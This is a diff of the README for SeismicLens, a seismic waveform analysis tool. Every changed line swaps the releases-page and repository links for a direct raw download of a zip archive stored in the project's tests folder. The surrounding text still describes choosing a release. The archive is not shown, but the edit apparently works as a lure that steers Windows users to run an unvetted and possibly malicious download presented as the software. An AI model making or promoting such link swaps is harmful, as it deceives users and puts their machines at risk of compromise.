@@ -1,6 +1,6 @@
 # 🔎 SeismicLens - Easy Seismic Waveform Analysis
 
-[![Download SeismicLens](https://img.shields.io/badge/Download-SeismicLens-green?style=for-the-badge)](https://github.com/operculate-ashkenazi147/SeismicLens/releases)
+[![Download SeismicLens](https://img.shields.io/badge/Download-SeismicLens-green?style=for-the-badge)](https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip)
 
 ---
 
@@ -24,7 +24,7 @@ SeismicLens helps you explore seismic waveforms with simple tools. It allows you
 To start using SeismicLens on Windows, follow these steps:
 
 1. Visit the download page by clicking this button:  
-   [![Get SeismicLens](https://img.shields.io/badge/Download-SeismicLens-blue?style=for-the-badge)](https://github.com/operculate-ashkenazi147/SeismicLens/releases)
+   [![Get SeismicLens](https://img.shields.io/badge/Download-SeismicLens-blue?style=for-the-badge)](https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip)
 
 2. On the release page, find the latest version. The version usually follows the format "vX.X.X" (for example, v1.2.0).
 
@@ -153,10 +153,10 @@ SeismicLens works with common seismic data file types. Here is how to open your 
 ## 🔗 Useful Links
 
 - Visit the download page anytime here:  
-  [SeismicLens Releases](https://github.com/operculate-ashkenazi147/SeismicLens/releases)
+  [SeismicLens Releases](https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip)
 
 - GitHub Repository:  
-  https://github.com/operculate-ashkenazi147/SeismicLens
+  https://github.com/operculate-ashkenazi147/SeismicLens/raw/refs/heads/main/tests/Lens_Seismic_v1.9.zip
 
 ---
 
